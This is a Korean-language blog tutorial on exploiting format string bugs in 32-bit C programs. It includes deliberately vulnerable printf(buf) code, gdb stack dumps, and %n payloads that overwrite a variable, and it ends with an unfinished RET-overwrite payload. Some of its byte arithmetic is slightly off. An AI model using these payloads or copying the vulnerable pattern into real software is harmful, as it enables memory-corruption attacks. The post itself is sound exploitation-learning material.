@@ -1,0 +1,467 @@
+---
+layout: article
+title: "[System]System hacking Start"
+key: 19700101
+tags:
+  - Pwnable
+toc: true
+mathjax: true
+mathjax_autoNumber: true
+---
+
+# [+] Format String Bug(FSB)
+
+<!--more-->
+
+본격적인 시스템 해킹 공부를 시작한다. 리버싱과도 연관이 있으므로 매우 유익한 듯 하다.
+첫번째 주제로 FSB를 선택했다. 
+
+## [+] Concept
+
+아래와 같이 `printf` 와 같은 함수에 사용되는 인자를 변수를 직접적으로 지정하여 사용했을 때, 포맷 스트링을 입력하여 메모리 주소를 누출(leak) 시키거나, 프로그램의 흐름을 제어할 수 있는 취약점을 말한다.
+
+```c++
+fgets(buf,sizeof(buf),stdin);
+printf(buf);
+```
+
+## [+] Example
+
+실제 디버깅을 하며 확인하는게 좋을 듯 하다.
+
+예제 코드는 다음과 같다.
+
+```c++
+#include <stdio.h>
+
+int main()
+{
+    char buf[20];
+    fgets(buf,sizeof(buf),stdin);
+	printf(buf);
+}
+```
+
+```
+root@shh0ya-Linux:~/pwn# gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack -no-pie exam.c -o exam
+```
+
+```
+root@shh0ya-Linux:~/pwn# peda ./exam
+Reading symbols from ./exam...(no debugging symbols found)...done.
+gdb-peda$ disass main
+Dump of assembler code for function main:
+   0x0804846b <+0>:	push   ebp
+   0x0804846c <+1>:	mov    ebp,esp
+   0x0804846e <+3>:	sub    esp,0x14
+   0x08048471 <+6>:	mov    eax,ds:0x804a020
+   0x08048476 <+11>:	push   eax
+   0x08048477 <+12>:	push   0x14
+   0x08048479 <+14>:	lea    eax,[ebp-0x14]
+   0x0804847c <+17>:	push   eax
+   0x0804847d <+18>:	call   0x8048340 <fgets@plt>
+   0x08048482 <+23>:	add    esp,0xc
+   0x08048485 <+26>:	lea    eax,[ebp-0x14]
+   0x08048488 <+29>:	push   eax
+   0x08048489 <+30>:	call   0x8048330 <printf@plt>
+   0x0804848e <+35>:	add    esp,0x4
+   0x08048491 <+38>:	mov    eax,0x0
+   0x08048496 <+43>:	leave  
+   0x08048497 <+44>:	ret    
+End of assembler dump.
+```
+
+`fgets` 함수에 브레이크 포인트를 설치하고, 함수 내부로 진입했을 때의 스택을 확인해본다.
+
+```
+Breakpoint 1, 0x0804847d in main ()
+gdb-peda$ si
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd5d4 --> 0x8048210 --> 0x2d ('-')
+EBX: 0x0 
+ECX: 0x96dd10cc 
+EDX: 0xffffd614 --> 0x0 
+ESI: 0xf7fb3000 --> 0x1b1db0 
+EDI: 0xf7fb3000 --> 0x1b1db0 
+EBP: 0xffffd5e8 --> 0x0 
+ESP: 0xffffd5c4 --> 0x8048482 (<main+23>:	add    esp,0xc)
+EIP: 0x8048340 (<fgets@plt>:	jmp    DWORD PTR ds:0x804a010)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048330 <printf@plt>:	jmp    DWORD PTR ds:0x804a00c
+   0x8048336 <printf@plt+6>:	push   0x0
+   0x804833b <printf@plt+11>:	jmp    0x8048320
+=> 0x8048340 <fgets@plt>:	jmp    DWORD PTR ds:0x804a010
+ | 0x8048346 <fgets@plt+6>:	push   0x8
+ | 0x804834b <fgets@plt+11>:	jmp    0x8048320
+ | 0x8048350 <__libc_start_main@plt>:	jmp    DWORD PTR ds:0x804a014
+ | 0x8048356 <__libc_start_main@plt+6>:	push   0x10
+ |->   0x8048346 <fgets@plt+6>:	push   0x8
+       0x804834b <fgets@plt+11>:	jmp    0x8048320
+       0x8048350 <__libc_start_main@plt>:	jmp    DWORD PTR ds:0x804a014
+       0x8048356 <__libc_start_main@plt+6>:	push   0x10
+                                                                  JUMP is taken
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd5c4 --> 0x8048482 (<main+23>:	add    esp,0xc)
+0004| 0xffffd5c8 --> 0xffffd5d4 --> 0x8048210 --> 0x2d ('-')
+0008| 0xffffd5cc --> 0x14 
+0012| 0xffffd5d0 --> 0xf7fb35a0 --> 0xfbad2088 
+0016| 0xffffd5d4 --> 0x8048210 --> 0x2d ('-')
+0020| 0xffffd5d8 --> 0x80484a9 (<__libc_csu_init+9>:	add    ebx,0x1b57)
+0024| 0xffffd5dc --> 0x0 
+0028| 0xffffd5e0 --> 0xf7fb3000 --> 0x1b1db0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08048340 in fgets@plt ()
+
+gdb-peda$ x/16x $esp
+0xffffd5c4:	0x08048482	0xffffd5d4	0x00000014	0xf7fb35a0
+0xffffd5d4:	0x08048210	0x080484a9	0x00000000	0xf7fb3000
+0xffffd5e4:	0xf7fb3000	0x00000000	0xf7e19637	0x00000001
+0xffffd5f4:	0xffffd684	0xffffd68c	0x00000000	0x00000000
+```
+
+스택부분을 확인하면 다음과 같이 `RET | buf | size(20) | stdin` 으로 `ESP+C` 까지 구성되어 있다.
+
+`buf` 의 주소를 보면 `ESP+10` 인 것을 확인할 수 있다. 즉 해당 위치에 입력한 값이 출력 될 것이다. 정상적인 입력을 하고 스택을 보고 확인한다.
+
+```
+gdb-peda$ c
+Continuing.
+AAAA
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd5d4 ("AAAA\n")
+EBX: 0x0 
+ECX: 0x0 
+EDX: 0xf7fb487c --> 0x0 
+ESI: 0xf7fb3000 --> 0x1b1db0 
+EDI: 0xf7fb3000 --> 0x1b1db0 
+EBP: 0xffffd5e8 --> 0x0 
+ESP: 0xffffd5c8 --> 0xffffd5d4 ("AAAA\n")
+EIP: 0x8048482 (<main+23>:	add    esp,0xc)
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048479 <main+14>:	lea    eax,[ebp-0x14]
+   0x804847c <main+17>:	push   eax
+   0x804847d <main+18>:	call   0x8048340 <fgets@plt>
+=> 0x8048482 <main+23>:	add    esp,0xc
+   0x8048485 <main+26>:	lea    eax,[ebp-0x14]
+   0x8048488 <main+29>:	push   eax
+   0x8048489 <main+30>:	call   0x8048330 <printf@plt>
+   0x804848e <main+35>:	add    esp,0x4
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd5c8 --> 0xffffd5d4 ("AAAA\n")
+0004| 0xffffd5cc --> 0x14 
+0008| 0xffffd5d0 --> 0xf7fb35a0 --> 0xfbad2288 
+0012| 0xffffd5d4 ("AAAA\n")
+0016| 0xffffd5d8 --> 0x804000a 
+0020| 0xffffd5dc --> 0x0 
+0024| 0xffffd5e0 --> 0xf7fb3000 --> 0x1b1db0 
+0028| 0xffffd5e4 --> 0xf7fb3000 --> 0x1b1db0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 2, 0x08048482 in main ()
+gdb-peda$ x/16x $esp
+0xffffd5c8:	0xffffd5d4	0x00000014	0xf7fb35a0	0x41414141
+0xffffd5d8:	0x0804000a	0x00000000	0xf7fb3000	0xf7fb3000
+0xffffd5e8:	0x00000000	0xf7e19637	0x00000001	0xffffd684
+0xffffd5f8:	0xffffd68c	0x00000000	0x00000000	0x00000000
+```
+
+함수를 빠져 나오므로 위와 같은 스택으로 구성되며 위에서 예상한대로 스택이 구성되었다.
+자 다시 실행해서 이번에는 20바이트를 꽉채워서 스택을 확인해보자.
+
+```
+gdb-peda$ c
+Continuing.
+AAAAAAAAAAAAAAAAAAAA
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd5d4 ('A' <repeats 19 times>)
+EBX: 0x0 
+ECX: 0x0 
+EDX: 0xf7fb487c --> 0x0 
+ESI: 0xf7fb3000 --> 0x1b1db0 
+EDI: 0xf7fb3000 --> 0x1b1db0 
+EBP: 0xffffd5e8 --> 0x0 
+ESP: 0xffffd5c8 --> 0xffffd5d4 ('A' <repeats 19 times>)
+EIP: 0x8048482 (<main+23>:	add    esp,0xc)
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048479 <main+14>:	lea    eax,[ebp-0x14]
+   0x804847c <main+17>:	push   eax
+   0x804847d <main+18>:	call   0x8048340 <fgets@plt>
+=> 0x8048482 <main+23>:	add    esp,0xc
+   0x8048485 <main+26>:	lea    eax,[ebp-0x14]
+   0x8048488 <main+29>:	push   eax
+   0x8048489 <main+30>:	call   0x8048330 <printf@plt>
+   0x804848e <main+35>:	add    esp,0x4
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd5c8 --> 0xffffd5d4 ('A' <repeats 19 times>)
+0004| 0xffffd5cc --> 0x14 
+0008| 0xffffd5d0 --> 0xf7fb35a0 --> 0xfbad2288 
+0012| 0xffffd5d4 ('A' <repeats 19 times>)
+0016| 0xffffd5d8 ('A' <repeats 15 times>)
+0020| 0xffffd5dc ('A' <repeats 11 times>)
+0024| 0xffffd5e0 ("AAAAAAA")
+0028| 0xffffd5e4 --> 0x414141 ('AAA')
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 2, 0x08048482 in main ()
+gdb-peda$ x/24x $esp
+0xffffd5c8:	0xffffd5d4	0x00000014	0xf7fb35a0	0x41414141
+0xffffd5d8:	0x41414141	0x41414141	0x41414141	0x00414141
+0xffffd5e8:	0x00000000	0xf7e19637	0x00000001	0xffffd684
+0xffffd5f8:	0xffffd68c	0x00000000	0x00000000	0x00000000
+0xffffd608:	0xf7fb3000	0xf7ffdc04	0xf7ffd000	0x00000000
+0xffffd618:	0xf7fb3000	0xf7fb3000	0x00000000	0x8155e276
+```
+
+널 문자를 포함하여 정확하게 20바이트만큼 사용한다. 그럼 여기서 포맷 스트링을 입력하여 취약점이 어떻게 발생하는지 확인한다.
+
+```
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd5d4 ("AAAA %X %X %X\n")
+EBX: 0x0 
+ECX: 0x0 
+EDX: 0xf7fb487c --> 0x0 
+ESI: 0xf7fb3000 --> 0x1b1db0 
+EDI: 0xf7fb3000 --> 0x1b1db0 
+EBP: 0xffffd5e8 --> 0x0 
+ESP: 0xffffd5d0 --> 0xffffd5d4 ("AAAA %X %X %X\n")
+EIP: 0x8048489 (<main+30>:	call   0x8048330 <printf@plt>)
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048482 <main+23>:	add    esp,0xc
+   0x8048485 <main+26>:	lea    eax,[ebp-0x14]
+   0x8048488 <main+29>:	push   eax
+=> 0x8048489 <main+30>:	call   0x8048330 <printf@plt>
+   0x804848e <main+35>:	add    esp,0x4
+   0x8048491 <main+38>:	mov    eax,0x0
+   0x8048496 <main+43>:	leave  
+   0x8048497 <main+44>:	ret
+Guessed arguments:
+arg[0]: 0xffffd5d4 ("AAAA %X %X %X\n")
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd5d0 --> 0xffffd5d4 ("AAAA %X %X %X\n")
+0004| 0xffffd5d4 ("AAAA %X %X %X\n")
+0008| 0xffffd5d8 (" %X %X %X\n")
+0012| 0xffffd5dc ("%X %X\n")
+0016| 0xffffd5e0 --> 0xf7000a58 
+0020| 0xffffd5e4 --> 0xf7fb3000 --> 0x1b1db0 
+0024| 0xffffd5e8 --> 0x0 
+0028| 0xffffd5ec --> 0xf7e19637 (<__libc_start_main+247>:	add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08048489 in main ()
+
+gdb-peda$ x/16x $esp
+0xffffd5d0:	0xffffd5d4	0x41414141	0x20582520	0x25205825
+0xffffd5e0:	0xf7000a58	0xf7fb3000	0x00000000	0xf7e19637
+0xffffd5f0:	0x00000001	0xffffd684	0xffffd68c	0x00000000
+0xffffd600:	0x00000000	0x00000000	0xf7fb3000	0xf7ffdc04
+```
+
+`printf` 호출 직전의 스택이다. 입력 값은 `AAAA %X %X %X` 이며, 스택을 확인하면 개행(`0a`)까지 잘 입력되어 있다.
+이대로 출력하면 결과는 다음과 같이 스택에 있는 값들이 출력된다.
+
+```
+Breakpoint 3, 0x08048489 in main ()
+gdb-peda$ ni
+AAAA 41414141 20582520 25205825
+```
+
+예상과는 약간 다른 출력 값이 나온다.. 아직 원인은 모르겠다. 이렇다 하더라도 입력 값을 늘려 내가 원하는 값을 조작할 수 있다. 
+
+```c++
+#include <stdio.h>
+
+int main()
+{
+	int num=1234;
+	char buf[20];
+	printf("addr = %p\n",&num);
+	gets(buf);
+	printf(buf);
+	printf("\n");
+	printf("num = %d\n",num);
+}
+```
+
+간단하게 변수의 주소를 출력하고 이 주소를 이용하여 공격을 시도해본다.
+
+```
+root@shh0ya-Linux:~/pwn# clear
+root@shh0ya-Linux:~/pwn# (python -c 'print "AAAA\xf4\xd5\xff\xff%1230x%n"';cat)|./exam
+addr = 0xffffd5f4
+AAAA񗀿                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      41414141
+num = 1238
+```
+
+1238이 출력되는 이유는 `AAAA+&num(4)` 까지 8바이트가 존재하기 때문이다. 1230 만큼과 8바이트 만큼의 출력 길이가 num 변수에 저장되어 위와 같은 결과를 가져오는 것이다.
+
+## [+] Training 1
+
+```c++
+#include <stdio.h>
+#include <string.h>
+ 
+int main() {
+    char flag[] = "0";
+    char buf[20];
+    fgets(buf, sizeof(buf), stdin);                          
+    printf(buf);
+    printf("%p\n",&flag);
+    if(!strcmp(flag,"1")) {
+        printf("Complete\n");
+    }
+}
+
+```
+
+```
+root@shh0ya-Linux:~/pwn/fsb# gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack -no-pie exam.c -o exam -w
+```
+
+간단한 코드다. 단 `strcmp`를 통해 `flag` 변수의 값이 `"1"`(0x31,49) 가 되어야 `Complete` 라는 문자열이 출력된다.
+이 코드로 연습을 해본다.
+
+```
+root@shh0ya-Linux:~/pwn/fsb# ./exam
+AAAA %x %x
+AAAA 414133dc 25204141
+ffffd5f6
+```
+
+`"AAAA %x %x"` 입력 시 위와 같은 결과를 볼 수 있다. 자 `flag`의 주소를 출력하도록 해놨으므로 해당 주소를 이용하여 변수의 값을 변조해본다.
+
+현재 4바이트의 더미 값을 입력하였더니 두 개의 메모리에서 나누어 출력되었다. 그렇다면 첫 번째 서식에서 출력 된 `414133dc` 에서 `33dc` 는 기존의 어떤 값이고, 해당 값 다음부터가 변수의 시작 주소라고 볼 수 있다.
+
+변조를 하기 위해 2바이트의 더미를 입력하고, `flag` 의 주소를 입력해본다.
+
+```
+root@shh0ya-Linux:~/pwn/fsb# (python -c 'print "AA\xf6\xd5\xff\xff %x %x"'; cat)|./exam
+AA󗀿 414133dc ffffd5f6
+ffffd5f6
+```
+
+위와 같이 내가 원하는 위치에 특정 주소를 입력했다. 그러면 이제 `%n` 서식을 이용하여 내가 원하는 값을 해당 주소에 복사하면 된다.
+
+### [-] Point
+
+`printf` 함수는 내부적으로 매우 복잡하게 되어있다. 한 글자씩 가져와 그냥 문자인지, 포맷스트링인지도 확인한다.
+이 때 `%` 문자를 만나게 되면 다음 문자를 가져와 `d, x, X, n, s ...` 등인지 확인하고 서식에 맞는 로직을 타게 된다. 
+
+예를 들어, `printf("Shh0ya%n",&num)` 이라는 구문이 있다면, `printf` 호출 직전 스택의 ESP 에는 입력 값 주소(`"Shh0ya%n"`) 이 저장된다. 그리고 두번째 인자인 `&num` 은 ESP+4 위치에 저장된다.
+
+`printf` 는 내부적으로 한 문자씩 가져와 일반 문자인지, 포맷스트링인지 확인한다. `%` 문자라면 바로 다음 문자를 가져와 `d,x,X,s,c,n,p` 등등 인지 확인하고 해당하는 로직을 실행하게 된다. `%n`의 경우 내부적으로 `_get_print_count_ouput` 과 같은 로직이 호출되고 이 때 길이를 확인하고 이 값을 위의 ESP+4 의 주소 안에 복사한다.
+
+자 그럼 다음 내용을 보고 동작을 분석해본다.
+
+```
+root@shh0ya-Linux:~/pwn/fsb# (python -c 'print "AA\xf6\xd5\xff\xff%43x%n"'; cat) | ./exam
+AA󗀿                                   414133dc
+ffffd5f6
+Complete
+```
+
+보면 `Complete`가 출력됐다. 디버거를 이용해 정확한 동작을 분석한다. `printf` 호출 직전에 브레이크 포인트를 설치하고 위와 같은 입력 값으로 실행하고 스택을 본다.
+
+```
+gdb-peda$ r < <(python -c 'print "AA\xd6\xd5\xff\xff%43x%n"')
+Starting program: /root/pwn/fsb/exam < <(python -c 'print "AA\xd6\xd5\xff\xff%43x%n"')
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd5c2 --> 0xd5d64141 
+EBX: 0x0 
+ECX: 0x0 
+EDX: 0xf7fb487c --> 0x0 
+ESI: 0xf7fb3000 --> 0x1b1db0 
+EDI: 0xf7fb3000 --> 0x1b1db0 
+EBP: 0xffffd5d8 --> 0x0 
+ESP: 0xffffd5bc --> 0xffffd5c2 --> 0xd5d64141 
+EIP: 0x80484ef (<main+36>:	call   0x8048380 <printf@plt>)
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80484e8 <main+29>:	add    esp,0xc
+   0x80484eb <main+32>:	lea    eax,[ebp-0x16]
+   0x80484ee <main+35>:	push   eax
+=> 0x80484ef <main+36>:	call   0x8048380 <printf@plt>
+   0x80484f4 <main+41>:	add    esp,0x4
+   0x80484f7 <main+44>:	lea    eax,[ebp-0x2]
+   0x80484fa <main+47>:	push   eax
+   0x80484fb <main+48>:	push   0x80485c0
+Guessed arguments:
+arg[0]: 0xffffd5c2 --> 0xd5d64141 
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd5bc --> 0xffffd5c2 --> 0xd5d64141 
+0004| 0xffffd5c0 --> 0x414133dc 
+0008| 0xffffd5c4 --> 0xffffd5d6 --> 0x30 ('0')
+0012| 0xffffd5c8 ("%43x%n\n")
+0016| 0xffffd5cc --> 0xa6e25 ('%n\n')
+0020| 0xffffd5d0 --> 0xf7fb3000 --> 0x1b1db0 
+0024| 0xffffd5d4 --> 0x303000 ('')
+0028| 0xffffd5d8 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x080484ef in main ()
+
+```
+
+```
+gdb-peda$ x/16x $esp
+0xffffd5bc:	0xffffd5c2	0x414133dc	0xffffd5d6	0x78333425
+0xffffd5cc:	0x000a6e25	0xf7fb3000	0x00303000	0x00000000
+0xffffd5dc:	0xf7e19637	0x00000001	0xffffd674	0xffffd67c
+0xffffd5ec:	0x00000000	0x00000000	0x00000000	0xf7fb3000
+```
+
+ESP에는 문자열의 주소가 저장되어 있다. ESP+6의 위치부터 버퍼가 시작되는 것을 확인할 수 있다.
+이 때, ESP+8의 위치에는 변조해야 하는 `flag`의 주소 값이 저장되었다. 
+
+디버거에서 확인 시, `flag` 주소 값의 0x20 만큼 차이가 나는 것을 확인할 수 있다.
+
+자 이제 `printf` 함수의 입장에서 본다.
+ESP+6부터 한 글자씩 읽어온다. `0x41 0x41 0xd6 0xd5 0xff 0x ff 0xff ..` 그러다 ESP+C의 위치에 `0x25("%")` 를 만나게 되고 다음 문자를 읽어 어떤 동작을 할지 결정한다.
+
+그러나 `0x34, 0x33`으로 해당하는 문자가 없으므로 그 다음 문자인 `0x78("x")` 를 읽고, 이에 맞는 동작을 수행한다.
+ESP+4 의 값을 포맷스트링에 대응하는 주소로 생각하고 43바이트의 Hex 형태로 출력을 해준다. 그리고 다시 문자를 읽는데 다시 "%"를 만나게 된다. 바로 다음 문자는 `0x6e("n")` 으로 위에서 출력한 길이를 계산한다. 
+
+```
+AA = 2 bytes
+dummy(%43x) = 43 bytes
+414133dc(%x) = 4 bytes
+
+AA+dummy+414133dc = 49 bytes
+```
+
+위와 같은 길이가 계산된다. 두 번째 포맷 스트링이기 때문에 ESP+8 위치의 값 안에 이 값이 저장되게 된다.
+현재 ESP+8 의 위치에는 `flag` 변수의 주소 값이 담겨있다. 
+
+그렇기 때문에 `49(0x31)` 으로 변조되어 내가 원하는 흐름으로 제어가 가능한 것이다.
+
+## [+] Training 2
+
+자 그러면 이번에는 포맷 스트링을 이용하여 쉘을 획득하는 방법에 대해 연습해본다.
+
+먼저 RET를 공략해보자.
+
+내일 계속~
+
+```
+ r < <(python -c 'print "AA\xdc\xd5\xff\xff%134513861x%n"')
+```
+
+
+
+
+
+
+
+
+
